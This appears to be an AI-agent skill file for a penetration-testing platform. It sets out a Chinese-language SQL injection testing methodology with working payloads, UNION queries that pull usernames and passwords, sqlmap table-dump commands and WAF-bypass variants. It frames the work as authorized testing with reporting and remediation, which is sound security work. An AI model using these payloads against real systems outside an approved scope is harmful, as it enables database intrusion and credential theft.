---
name: antifox-sql-injection-testing
description: "驗證 SQL 注入、查詢參數與資料庫錯誤，記錄最小證據（SQL injection SQLi）。"
license: AGPL-3.0
---

改寫自 [AntiFox / sql-injection-testing](https://github.com/AntiFox-AI/antifox/blob/070f798bf590667bc2a0a13c687dd87d8a4413bf/skills/sql-injection-testing/SKILL.md)（AGPL-3.0）。原文與授權見 `${SKILL_DIR}/references/source.md`、`${SKILL_DIR}/references/LICENSE`。

## ARTEX 整合約定

1. 本文件提供方法與範例。先用目前可用的工具 schema、已核准範圍及實際環境決定步驟；範例的主機、帳號、回應與程式片段不是目前目標的事實。不要照抄範例中的廣域掃描、資料傾印、破壞、關閉 TLS 驗證或停用驗證設定。
2. 外部 CLI、商業產品、MCP 與 Python 套件均須另查是否已安裝、綁定及可執行。技能清單與工具相依索引不代表工具已就緒。沿用 ARTEX 現有代理、範圍與操作審批；載入技能不增加權限。
3. 可先用 `search_knowledge` 在目前可見技能中找相關段落，再用 `Skill` 載入完整程序。檢索結果是參考資料，不會解鎖 MCP，也不是漏洞證據。
4. 已確認的發現交給現有 `report_finding`；使用本次工具輸出的實際證據，保留前置條件、操作、預期結果與觀察結果。未確認的假設寫為 fact/hint，並標記不確定性。平台對話沒有任務上下文時，用現有任務交接工具。
5. HTTP 流量只使用已核實的引用，遵守目前的流量綁定開關及報告流程。`finding_id` 與 `finding_node_id` 是不同編號，依實際工具說明使用。無確切流量時保留文字與命令證據，不猜編號或為補證據重打目標。

# SQL注入测试技能

## 概述

SQL注入是一种常见且危险的Web应用漏洞。本技能提供了系统化的SQL注入测试方法、检测技术和利用策略。

## 测试方法

### 1. 参数识别
- 识别所有用户输入点：URL参数、POST数据、HTTP头、Cookie等
- 重点关注：id、search、filter、sort等参数
- 使用Burp Suite或类似工具拦截和修改请求

### 2. 基础检测
- 单引号测试：`'` - 查看是否出现SQL错误
- 布尔盲注：`' AND '1'='1` vs `' AND '1'='2`
- 时间盲注：`' AND SLEEP(5)--`
- 联合查询：`' UNION SELECT NULL--`

### 3. 数据库识别
- MySQL：`' AND @@version LIKE '%mysql%'--`
- PostgreSQL：`' AND version() LIKE '%PostgreSQL%'--`
- MSSQL：`' AND @@version LIKE '%Microsoft%'--`
- Oracle：`' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. 信息提取
- 数据库名：`' UNION SELECT database()--`
- 表名：`' UNION SELECT table_name FROM information_schema.tables--`
- 列名：`' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- 数据提取：`' UNION SELECT username,password FROM users--`

## 工具使用

### sqlmap
```bash
# 基础扫描
sqlmap -u "http://target.com/page?id=1"

# 指定参数
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

# 指定数据库类型
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# 获取数据库列表
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 获取数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### 手动测试
- 使用Burp Suite的Repeater模块
- 使用浏览器开发者工具
- 编写Python脚本自动化测试

## 绕过技术

### WAF绕过
- 编码绕过：URL编码、Unicode编码、十六进制编码
- 注释绕过：`/**/`, `--`, `#`
- 大小写混合：`SeLeCt`, `UnIoN`
- 空格替换：`/**/`, `+`, `%09`(Tab), `%0A`(换行)

### 示例
```
原始：' UNION SELECT NULL--
绕过1：'/**/UNION/**/SELECT/**/NULL--
绕过2：'%55nion%20select%20null--
绕过3：'/*!UNION*//*!SELECT*/null--
```

## 验证和报告

### 验证步骤
1. 确认可以执行SQL语句
2. 提取数据库信息验证
3. 评估影响范围（数据泄露、权限提升等）
4. 记录完整的POC（请求/响应）
5. 通过 `report_finding` 工具将确认的漏洞录入平台（本平台记录漏洞的唯一入口），字段涵盖位置、类型、严重度、复现步骤/PoC 与修复建议

### 报告要点
- 漏洞位置和参数
- 影响的数据和系统
- 完整的利用步骤
- 修复建议（参数化查询、输入验证等）

## 注意事项

- 仅在授权测试环境中进行
- 避免对生产数据造成破坏
- 谨慎使用DROP、DELETE等危险操作
- 记录所有测试步骤以便复现
